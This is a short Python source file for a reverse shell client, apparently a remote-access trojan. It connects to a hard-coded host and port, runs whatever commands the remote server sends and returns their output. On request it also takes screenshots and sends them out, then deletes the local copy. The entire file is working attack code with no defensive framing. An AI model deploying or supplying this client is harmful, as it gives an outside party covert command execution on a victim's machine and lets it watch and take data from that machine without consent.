import socket
import subprocess
import sys
import os
from PIL import Image
import pyautogui

PROXT_HOST = "10.0.10.6"
PROXY_PORT = 5003

BUFFER_SIZE = 1048576
image = "screenshot.png"
imgcounter = 1
basename = "image%s.png"

# create the socket object
s = socket.socket()
try:

    # connect to the server
    s.connect((PROXT_HOST, PROXY_PORT))
    print("connecting...")
except:
    print("Failed to connect to proxy")
    sys.exit()
# receive the greeting message
message = s.recv(BUFFER_SIZE).decode()
print("Server:", message)

while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        print("Lost Connection to Server: Disconnected by User")
        break
    # if server sends screenshot command
    if command.lower() == "screenshot":
        print("Recieved screenshot request") # used for debugging
        s.send("sending image".encode()) # lets server know command was recieved and image is being sent
        Image = pyautogui.screenshot(image) # take screenshot and save it
        
        with open(image, "rb") as f:
            data = f.read() # read image bytes
            s.sendall(data) # send image bytes
            f.close() # close image
            os.remove(image) # delete image
    # execute the command and retrieve the results
    output = subprocess.getoutput(command)
    # send the results back to the server
    s.send(output.encode())
# close client connection
s.close()